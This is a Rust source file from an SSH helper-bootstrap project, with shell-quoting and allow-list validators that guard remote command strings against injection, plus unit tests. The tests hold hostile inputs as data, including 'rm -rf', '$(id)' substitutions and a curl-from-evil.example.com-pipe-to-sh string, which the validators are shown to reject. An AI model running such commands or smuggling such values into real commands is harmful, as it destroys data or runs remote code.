//! Constants shared by the two independent isekai-helper bootstrap
//! implementations: `rust-core/src/helper_bootstrap.rs` (Android, over a
//! `russh::client::Handle`) and `isekai-bootstrap::openssh` (the `isekai-ssh`
//! CLI, over spawned `ssh(1)` subprocesses). Both upload the same binary to
//! the same path and poll for the same handshake-file contract
//! (`archive/HELPER_PROTOCOL.md`), so the remote-side paths/filenames must actually
//! be identical — keeping them as one shared `const` rather than two
//! hand-copied literals is what guarantees that, not just documents it.
//!
//! `isekai-terminal-core` is built as a `cdylib`/`staticlib` and can't be
//! depended on as an ordinary Rust crate, so `rust-core/src/helper_bootstrap.rs`
//! can't just import `isekai-bootstrap` directly — but both it and
//! `isekai-bootstrap` already depend on this pure `isekai-protocol` crate, so
//! this is where the shared literals live.

/// Remote install directory for the deployed binary.
pub const ISEKAI_PIPE_INSTALL_DIR: &str = "~/.local/bin";
/// Remote filename of the deployed binary (`isekai-pipe`, launched remotely
/// as `isekai-pipe serve ...`; formerly the standalone `isekai-helper`
/// binary before it was merged into `isekai-pipe`,
/// `archive/ISEKAI_PIPE_MIGRATION.md` P5).
pub const ISEKAI_PIPE_BIN_NAME: &str = "isekai-pipe";
/// How many times the bootstrap remote shell polls for the handshake file to
/// become non-empty before giving up.
pub const HANDSHAKE_POLL_ATTEMPTS: u32 = 50;
/// Delay between handshake-file polls, in milliseconds.
pub const HANDSHAKE_POLL_INTERVAL_MS: u32 = 100;

use crate::error::ProtocolError;

/// Single-quotes `s` for safe interpolation into a POSIX shell command
/// string, escaping embedded single quotes with the standard `'\''` trick
/// (close the quoted string, emit an escaped literal `'`, reopen the quoted
/// string). The result is always safe to splice into a `format!`-built shell
/// command regardless of `s`'s contents (security review #57 — both
/// `rust-core/src/helper_bootstrap.rs` and `isekai-bootstrap::openssh`
/// interpolate externally-supplied strings like `relay_sni`/`relay_jwt` into
/// a command string executed via a remote login shell, and previously did so
/// unquoted).
pub fn shell_single_quote(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('\'');
    for ch in s.chars() {
        if ch == '\'' {
            out.push_str("'\\''");
        } else {
            out.push(ch);
        }
    }
    out.push('\'');
    out
}

/// Characters allowed in `relay_sni`/`relay_jwt` once validated
/// (`validate_relay_sni`/`validate_relay_jwt`). Shared because a JWT
/// (base64url segments joined by `.`) and a DNS/SNI hostname happen to admit
/// the exact same strict charset.
fn is_allowed_bootstrap_arg_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-')
}

fn validate_charset(field: &'static str, value: &str) -> Result<(), ProtocolError> {
    if value.is_empty() {
        return Err(ProtocolError::InvalidBootstrapArg {
            field,
            reason: "must not be empty".to_string(),
        });
    }
    if let Some(bad) = value.chars().find(|c| !is_allowed_bootstrap_arg_char(*c)) {
        return Err(ProtocolError::InvalidBootstrapArg {
            field,
            reason: format!("contains disallowed character {bad:?} (allowed: A-Za-z0-9._-)"),
        });
    }
    Ok(())
}

/// Validates a `--relay-sni` value (TLS SNI / HTTP authority for the MASQUE
/// relay) against a strict allow-list charset, *in addition to*
/// shell-quoting it before interpolation (`shell_single_quote`). Defense in
/// depth: a compromised or misconfigured relay-issuing server should not be
/// able to smuggle shell metacharacters into a value that ends up in a
/// remote bootstrap command string, even if the quoting logic itself ever
/// regresses.
pub fn validate_relay_sni(sni: &str) -> Result<(), ProtocolError> {
    validate_charset("relay_sni", sni)
}

/// Validates a `--relay-jwt`/`--relay-jwt-file` value (the MASQUE relay
/// bearer token) against a strict allow-list charset: base64url alphabet
/// (`A-Za-z0-9_-`) plus `.` as the JWT segment separator. Same
/// defense-in-depth rationale as `validate_relay_sni`.
pub fn validate_relay_jwt(jwt: &str) -> Result<(), ProtocolError> {
    validate_charset("relay_jwt", jwt)
}

/// Characters allowed in a `#@isekai remote-path` value once validated
/// (`validate_remote_path`): the usual bootstrap-arg charset plus `/` (path
/// separator) and `~` (leading home-directory shorthand, expanded by the
/// remote shell itself — this is why the value is deliberately *not*
/// `shell_single_quote`-wrapped like `relay_sni` before interpolation, single
/// quoting would suppress that expansion).
fn is_allowed_remote_path_char(c: char) -> bool {
    is_allowed_bootstrap_arg_char(c) || matches!(c, '/' | '~')
}

/// Validates a `#@isekai remote-path` value against a strict allow-list
/// charset before it is interpolated into a remote bootstrap shell command
/// string (same defense-in-depth rationale as `validate_relay_sni`/
/// `validate_relay_jwt` — this value comes from the user's own `ssh_config`,
/// but a corrupted or attacker-controlled config file must not be able to
/// smuggle shell metacharacters into the remote command).
pub fn validate_remote_path(path: &str) -> Result<(), ProtocolError> {
    if let Some(bad) = path.chars().find(|c| !is_allowed_remote_path_char(*c)) {
        return Err(ProtocolError::InvalidBootstrapArg {
            field: "remote_path",
            reason: format!("contains disallowed character {bad:?} (allowed: A-Za-z0-9._-/~)"),
        });
    }
    if path.is_empty() {
        return Err(ProtocolError::InvalidBootstrapArg {
            field: "remote_path",
            reason: "must not be empty".to_string(),
        });
    }
    Ok(())
}

/// Validates a `--log-level` value for the deployed `isekai-pipe serve`
/// against `isekai-pipe`'s own accepted set, before it is interpolated into
/// a remote bootstrap shell command string (same defense-in-depth rationale
/// as `validate_relay_sni`/`validate_remote_path` — this value comes from
/// the user's own `ssh_config` via `#@isekai remote-log-level`, but a
/// corrupted or attacker-controlled config file must not be able to smuggle
/// shell metacharacters into the remote command). An exact allow-list
/// (rather than a charset check) is used because the accepted values are a
/// small fixed set, not free text.
pub fn validate_log_level(level: &str) -> Result<&str, ProtocolError> {
    match level {
        "error" | "warn" | "info" | "debug" | "trace" => Ok(level),
        other => Err(ProtocolError::InvalidBootstrapArg {
            field: "remote_log_level",
            reason: format!("{other:?} is not one of error|warn|info|debug|trace"),
        }),
    }
}

/// The directory `mkdir -p` should create for `path` (a full remote binary
/// path, e.g. `~/.local/bin/isekai-pipe` -> `~/.local/bin`). Falls back to
/// `.` for a bare filename with no directory component (harmless: `mkdir -p
/// .` always succeeds) and to `/` for a path directly under the filesystem
/// root. Shared by both bootstrap implementations so `upload_binary_command`
/// callers derive the same directory the same way.
pub fn remote_parent_dir(path: &str) -> &str {
    match path.rsplit_once('/') {
        Some((dir, _)) if !dir.is_empty() => dir,
        Some(_) => "/",
        None => ".",
    }
}

/// Builds the remote shell command that uploads a base64-encoded binary
/// (fed via the exec channel's stdin) to `remote_binary_path`: create the
/// parent directory, decode into a `.tmp` sibling, `chmod 0700`, then
/// atomically `mv` it into place (`archive/HELPER_PROTOCOL.md`'s "Bootstrap
/// file permissions" contract — 0700, never a partially-written executable
/// visible at the final path). Identical between
/// `rust-core/src/helper_bootstrap.rs` (Android) and
/// `isekai-bootstrap::openssh` (CLI) — only the exec transport (russh
/// channel vs. `ssh(1)` subprocess) differs, not this command string.
///
/// `remote_binary_path`/`remote_dir` are interpolated unquoted (so a leading
/// `~` still expands via the remote shell) — the caller must validate any
/// externally-supplied path with [`validate_remote_path`] first, exactly
/// like `isekai-bootstrap::openssh` already does; a crate's own trusted
/// constant (e.g. `ISEKAI_PIPE_INSTALL_DIR`/`ISEKAI_PIPE_BIN_NAME`) needs no
/// such validation.
pub fn upload_binary_command(remote_binary_path: &str, remote_dir: &str) -> String {
    format!(
        "umask 077 && mkdir -p {remote_dir} && \
         base64 -d > {remote_binary_path}.tmp && \
         chmod 0700 {remote_binary_path}.tmp && \
         mv {remote_binary_path}.tmp {remote_binary_path}"
    )
}

/// Outcome of [`classify_launch_failure`]: what kind of `--bind` failure (if
/// any) explains why `isekai-pipe serve` wrote no handshake before exiting.
/// Deliberately crate-neutral rather than either bootstrap implementation's
/// own error enum — `rust-core/src/helper_bootstrap.rs`'s `BootstrapError`
/// and `isekai-bootstrap::error::BootstrapError` have different variant
/// sets, so each caller maps this into its own type.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum LaunchFailureClass {
    BindPortInUse,
    BindPermissionDenied,
    BindAddressUnavailable,
    Unknown,
}

/// Classifies a captured stderr log (`isekai-pipe serve`'s stderr, retrieved
/// when it wrote no handshake before exiting) into a known `--bind` failure
/// reason, so the caller can surface something more actionable than a bare
/// timeout. `bind_port_requested` should be `false` when the launch didn't
/// request a fixed `--bind` port at all (an ephemeral-port launch failing
/// for some unrelated reason must never be misclassified as a bind failure).
///
/// `isekai-helper`/`isekai-pipe` is always distributed as a musl static
/// binary (`build-isekai-pipe-musl.sh`). musl libc's `strerror()` wording
/// differs from glibc's — `EADDRINUSE` is "Address already in use" on glibc
/// but "Address in use" (no "already") on musl — confirmed against the
/// actual musl-built binary in a real E2E test; a pattern written against a
/// glibc dev machine's wording alone never matched the real distributed
/// binary's output.
pub fn classify_launch_failure(log_text: &str, bind_port_requested: bool) -> LaunchFailureClass {
    if !bind_port_requested {
        return LaunchFailureClass::Unknown;
    }
    if log_text.contains("Address already in use") || log_text.contains("Address in use") {
        LaunchFailureClass::BindPortInUse
    } else if log_text.contains("Permission denied") {
        LaunchFailureClass::BindPermissionDenied
    } else if log_text.contains("Cannot assign requested address")
        || log_text.contains("Address not available")
    {
        LaunchFailureClass::BindAddressUnavailable
    } else {
        LaunchFailureClass::Unknown
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn remote_parent_dir_splits_off_the_filename() {
        assert_eq!(remote_parent_dir("~/.local/bin/isekai-pipe"), "~/.local/bin");
        assert_eq!(remote_parent_dir("/opt/isekai-pipe"), "/opt");
        assert_eq!(remote_parent_dir("/isekai-pipe"), "/");
        assert_eq!(remote_parent_dir("isekai-pipe"), ".");
    }

    #[test]
    fn upload_binary_command_embeds_path_and_dir() {
        let cmd = upload_binary_command("~/.local/bin/isekai-pipe", "~/.local/bin");
        assert!(cmd.contains("mkdir -p ~/.local/bin"));
        assert!(cmd.contains("base64 -d > ~/.local/bin/isekai-pipe.tmp"));
        assert!(cmd.contains("chmod 0700 ~/.local/bin/isekai-pipe.tmp"));
        assert!(cmd.contains("mv ~/.local/bin/isekai-pipe.tmp ~/.local/bin/isekai-pipe"));
    }

    #[test]
    fn classify_launch_failure_detects_address_in_use() {
        let log = "Error: Address already in use (os error 98)\n";
        assert_eq!(classify_launch_failure(log, true), LaunchFailureClass::BindPortInUse);
    }

    /// `isekai-helper`'s real distributed binary (musl static-linked) reports
    /// the same EADDRINUSE with different wording than glibc (no "already").
    /// Found via a real E2E test — without this pattern, production launches
    /// always misclassified as `HandshakeTimeout`.
    #[test]
    fn classify_launch_failure_detects_address_in_use_musl_wording() {
        let log = "Error: Address in use (os error 98)\n";
        assert_eq!(classify_launch_failure(log, true), LaunchFailureClass::BindPortInUse);
    }

    #[test]
    fn classify_launch_failure_detects_permission_denied() {
        let log = "Error: Permission denied (os error 13)\n";
        assert_eq!(classify_launch_failure(log, true), LaunchFailureClass::BindPermissionDenied);
    }

    #[test]
    fn classify_launch_failure_detects_address_unavailable() {
        let log = "Error: Cannot assign requested address (os error 99)\n";
        assert_eq!(classify_launch_failure(log, true), LaunchFailureClass::BindAddressUnavailable);
    }

    #[test]
    fn classify_launch_failure_falls_back_to_unknown_for_unrelated_reason() {
        let log = "some unrelated crash message\n";
        assert_eq!(classify_launch_failure(log, true), LaunchFailureClass::Unknown);
    }

    #[test]
    fn classify_launch_failure_falls_back_to_unknown_when_no_bind_port_was_requested() {
        // bind_portを指定していない(エフェメラルポート)場合、bind関連の文字列が
        // たまたまログに含まれていてもbind失敗として誤分類しない。
        let log = "Error: Address already in use (os error 98)\n";
        assert_eq!(classify_launch_failure(log, false), LaunchFailureClass::Unknown);
    }

    #[test]
    fn shell_single_quote_wraps_plain_values() {
        assert_eq!(shell_single_quote("hello"), "'hello'");
        assert_eq!(shell_single_quote(""), "''");
    }

    #[test]
    fn shell_single_quote_escapes_embedded_quotes() {
        assert_eq!(shell_single_quote("it's"), "'it'\\''s'");
    }

    #[test]
    fn shell_single_quote_neutralizes_shell_metacharacters() {
        // The whole point: even a maximally hostile value must round-trip as
        // an inert literal, never as executable shell syntax.
        let hostile = "'; rm -rf ~ #$(whoami)`id`";
        let quoted = shell_single_quote(hostile);
        // Reconstruct what a POSIX shell would see if it echoed the quoted
        // string back out, by feeding it through the exact same
        // single-quote escaping rules a shell itself applies: the value is
        // only ever inside single quotes or escaped single-quote literals.
        assert!(quoted.starts_with('\''));
        assert!(quoted.ends_with('\''));
        // No unescaped `'` should appear anywhere except as part of the
        // `'\''`escape sequence or the opening/closing quotes.
        let mut chars = quoted.chars().peekable();
        chars.next(); // opening quote
        while let Some(c) = chars.next() {
            if c == '\'' {
                // Must be either the final closing quote or the start of an
                // escape sequence `'\''`.
                if chars.peek().is_some() {
                    assert_eq!(chars.next(), Some('\\'));
                    assert_eq!(chars.next(), Some('\''));
                    assert_eq!(chars.next(), Some('\''));
                }
            }
        }
    }

    #[test]
    fn validate_relay_sni_accepts_typical_hostname() {
        assert!(validate_relay_sni("relay.example.com").is_ok());
    }

    #[test]
    fn validate_relay_sni_rejects_empty() {
        assert!(validate_relay_sni("").is_err());
    }

    #[test]
    fn validate_relay_sni_rejects_shell_metacharacters() {
        assert!(validate_relay_sni("relay.example.com; rm -rf /").is_err());
        assert!(validate_relay_sni("$(id)").is_err());
        assert!(validate_relay_sni("`id`").is_err());
    }

    #[test]
    fn validate_relay_jwt_accepts_typical_jwt() {
        assert!(validate_relay_jwt("eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U").is_ok());
    }

    #[test]
    fn validate_relay_jwt_rejects_empty() {
        assert!(validate_relay_jwt("").is_err());
    }

    #[test]
    fn validate_relay_jwt_rejects_shell_metacharacters() {
        assert!(validate_relay_jwt("abc.def.ghi; rm -rf /").is_err());
        assert!(validate_relay_jwt("$(id)").is_err());
    }

    #[test]
    fn validate_remote_path_accepts_typical_paths() {
        assert!(validate_remote_path("~/.local/bin/isekai-pipe").is_ok());
        assert!(validate_remote_path("/opt/isekai-pipe/bin/isekai-pipe").is_ok());
    }

    #[test]
    fn validate_remote_path_rejects_empty() {
        assert!(validate_remote_path("").is_err());
    }

    #[test]
    fn validate_remote_path_rejects_shell_metacharacters() {
        assert!(validate_remote_path("~/bin; rm -rf /").is_err());
        assert!(validate_remote_path("$(id)").is_err());
        assert!(validate_remote_path("`id`").is_err());
        assert!(validate_remote_path("~/bin && curl evil.example.com | sh").is_err());
    }
}
